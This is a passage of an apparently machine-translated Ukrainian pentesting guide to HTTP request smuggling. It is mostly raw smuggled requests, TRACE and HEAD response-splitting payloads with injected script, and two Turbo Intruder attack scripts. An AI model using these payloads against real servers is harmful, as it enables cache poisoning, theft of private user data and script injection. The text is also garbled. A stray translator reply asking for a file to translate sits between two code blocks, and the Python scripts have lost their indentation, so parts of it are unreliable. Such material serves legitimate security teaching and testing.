Атакуючий формує smuggled request, який отримує чутливий контент, специфічний для користувача. Розгляньмо наступний приклад:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Якщо цей smuggled request отруює запис кешу, призначений для статичного контенту (наприклад, `/someimage.png`), конфіденційні дані жертви з `/private/messages` можуть опинитися в кеші під записом статичного контенту. Внаслідок цього нападник потенційно зможе отримати ці кешовані чутливі дані.

### Abusing TRACE via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) пропонується, що якщо на сервері увімкнено метод TRACE, його можна зловживати через HTTP Request Smuggling. Це тому, що цей метод відображає будь-який заголовок, відправлений на сервер, у тілі відповіді. Наприклад:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Надішліть, будь ласка, вміст файлу src/pentesting-web/http-request-smuggling/README.md для перекладу. Я перекладу його українською, зберігши оригінальні markdown/HTML-теги, шляхи, посилання й код.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Приклад того, як зловживати цією поведінкою, — **smuggle first a HEAD request**. На цей запит буде відповідено лише **headers** of a GET request (**`Content-Type`** серед них). І smuggle **immediately after the HEAD a TRACE request**, який буде **reflecting the sent dat**a.\
Оскільки у відповіді на HEAD міститиметься заголовок `Content-Length`, **response of the TRACE request will be treated as the body of the HEAD response, therefore reflecting arbitrary data** у відповіді.\
Ця відповідь буде відправлена до наступного запиту по з'єднанню, тому це може бути **used in a cached JS file for example to inject arbitrary JS code**.

### Зловживання TRACE через HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Рекомендується також прочитати [**this post**](https://portswigger.net/research/trace-desync-attack) як інший спосіб зловживання методом TRACE. Як зазначалося, smuggling a HEAD request and a TRACE request дозволяє **control some reflected data** у відповіді на HEAD-запит. Довжина тіла HEAD-запиту фактично вказується в заголовку Content-Length і формується відповіддю на TRACE request.

Отже, нова ідея така: знаючи цей Content-Length і дані, отримані в TRACE response, можна зробити так, щоб TRACE response містила валідну HTTP-відповідь після останнього байта, визначеного Content-Length, що дозволить нападнику повністю контролювати request для наступної відповіді (що може бути використано для cache poisoning).

Приклад:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Згенерує ці відповіді (зверніть увагу, як відповідь HEAD має Content-Length, через що відповідь TRACE стає частиною тіла HEAD, і коли Content-Length у HEAD закінчується, коректна HTTP-відповідь підсовується):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Експлуатація HTTP Request Smuggling за допомогою HTTP Response Desynchronisation

Ви знайшли вразливість HTTP Request Smuggling і не знаєте, як її експлуатувати? Спробуйте ці інші методи експлуатації:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Інші техніки HTTP Request Smuggling

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Turbo intruder скрипти

### CL.TE

Джерело: [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Джерело: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Інструменти

- HTTP Hacker (Burp BApp Store) – візуалізувати конкатенацію/фреймінг та низькорівневу поведінку HTTP
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater Custom Action "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Цей інструмент — граматично-орієнтований HTTP Fuzzer, корисний для знаходження дивних невідповідностей у request smuggling.

## Посилання

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- Увага: подвійні хибнопозитиви — як відрізнити HTTP pipelining від request smuggling – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
- [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)


{{#include ../../banners/hacktricks-training.md}}
